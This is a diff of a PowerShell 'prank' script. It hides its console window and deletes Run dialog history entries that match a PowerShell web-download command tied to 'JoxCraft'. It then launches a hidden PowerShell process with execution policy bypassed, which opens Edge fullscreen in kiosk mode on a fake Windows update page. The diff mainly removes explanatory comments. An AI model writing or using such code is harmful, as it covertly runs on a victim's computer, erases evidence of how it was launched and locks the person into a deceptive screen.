@@ -1,4 +1,3 @@
-# Immediately hide the current window
 $null = Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")] 
 public static extern IntPtr GetConsoleWindow();
@@ -10,18 +9,14 @@ $hwnd = [Console.Window]::GetConsoleWindow()
 
 $kioskUrl = "https://fakeupdate.net/win10ue/"
 
-# Function to clear Run dialog history
 function Clear-RunHistory {
     Start-Sleep -Milliseconds 500
     
     $runPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
     if (Test-Path $runPath) {
-        # Get current entries
         $mruList = (Get-ItemProperty -Path $runPath).MRUList
         $entries = Get-ItemProperty -Path $runPath
-        
-        # Look for our pattern and remove it
-        foreach ($key in $mruList.ToCharArray()) {
+                foreach ($key in $mruList.ToCharArray()) {
             $value = $entries.$key
             if ($value -match 'powershell.*iwr.*JoxCraft') {
                 Remove-ItemProperty -Path $runPath -Name $key -ErrorAction SilentlyContinue
@@ -31,10 +26,10 @@ function Clear-RunHistory {
     }
 }
 
-# Clear history first
 Clear-RunHistory
 
-# Start the 5-minute delayed prank in a new hidden process
+$kioskUrl = "https://fakeupdate.net/win10ue"
+
 Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
     "-NoProfile",
     "-ExecutionPolicy", "Bypass",
@@ -42,5 +37,4 @@ Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
     "Start-Sleep -Seconds 3; Start-Process 'msedge.exe' '--kiosk $kioskUrl --edge-kiosk-type=fullscreen --no-first-run'"
 )
 
-# Exit immediately
 exit
